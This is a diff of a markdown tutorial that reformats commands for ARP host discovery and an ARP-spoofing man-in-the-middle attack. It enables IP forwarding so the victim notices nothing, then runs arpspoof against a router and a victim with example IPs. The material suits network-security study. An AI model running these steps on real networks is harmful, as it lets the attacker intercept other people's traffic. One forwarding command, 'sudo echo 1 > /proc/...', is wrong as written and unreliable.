@@ -18,15 +18,21 @@ The ARP protocol (Address Resolution Protocol) associates every MAC address with
 
 You can check the cache in your own machine with:
 
-> arp -a
+```console
+$ arp -a
+```
 
 Using ARP protocol you can either scan your local network to discover hosts, revealing their MAC addresses and internet adapter manufacturer:
 
-> sudo arp-scan --interface=eth0 --localnet
+```console
+$ sudo arp-scan --interface=eth0 --localnet
+```
 
 or try to guess the OS of the hosts with:
 
-> sudo arp-fingerprint -l
+```console
+$ sudo arp-fingerprint -l
+```
 
 # Attack Tools
 
@@ -38,19 +44,27 @@ The objective of this attack is to add/replace some entries in the ARP table mak
 
 ### Enabling fowarding:
 
-First you need to enable fowarding of packets so the victim doesn't know that something happened:
+First you need to enable fowarding of packets so the victim doesn't know that something happened.
 
-> sudo sysctl -w net.ipv4.ip_forward=1
+- For temporary fowarding ():
+
+```console
+$ sudo sysctl -w net.ipv4.ip_forward=1
+```
 
 or 
 
-> sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+```console
+$ sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+```
 
 but this will disable fowarding when the machine is rebooted.
 
-For permanent fowarding:
+- For permanent fowarding:
 
-> sudo nano /etc/sysctl.conf
+```console
+$ sudo nano /etc/sysctl.conf
+```
 
 then find the line:
 
@@ -69,33 +83,47 @@ net.ipv4.ip_forward=1
 then
 
 > Ctrl o
+
 > Enter
+
 > Ctrl x
 
 and finally run this to apply the changes:
 
-> sudo sysctl -p /etc/sysctl.conf
+```console
+$ sudo sysctl -p /etc/sysctl.conf
+```
 
 ### Making a man in the middle with Arpspoof:
 
 To make this we will use this command two times:
 
-> sudo arpspoof -i {NETWORK_INTERFACE} -t {TARGET_IP} {IP_YOU_WILL_BE_PRETENDING_TO_BE}
+```console
+$ sudo arpspoof -i {NETWORK_INTERFACE} -t {TARGET_IP} {IP_YOU_WILL_BE_PRETENDING_TO_BE}
+```
 
 - First to make the router think that our machine is the victim:
 
-> sudo arpspoof -i {NETWORK_INTERFACE} -t {ROUTER_IP} {VICTIM_IP}
+```console
+$ sudo arpspoof -i {NETWORK_INTERFACE} -t {ROUTER_IP} {VICTIM_IP}
+```
 
 Example:
 
-> sudo arpspoof -i eth0 -t 192.168.0.1 192.168.0.104
+```console
+$ sudo arpspoof -i eth0 -t 192.168.0.1 192.168.0.104
+```
 
 - Then we make the victim think that our machine is the router:
 
-> sudo arpspoof -i {NETWORK_INTERFACE} -t {VICTIM_IP} {ROUTER_IP}
+```console
+$ sudo arpspoof -i {NETWORK_INTERFACE} -t {VICTIM_IP} {ROUTER_IP}
+```
 
 Example:
 
-> sudo arpspoof -i eth0 -t 192.168.0.104 192.168.0.1
+```console
+$ sudo arpspoof -i eth0 -t 192.168.0.104 192.168.0.1
+```
 
 and with this we have a man in the middle set.
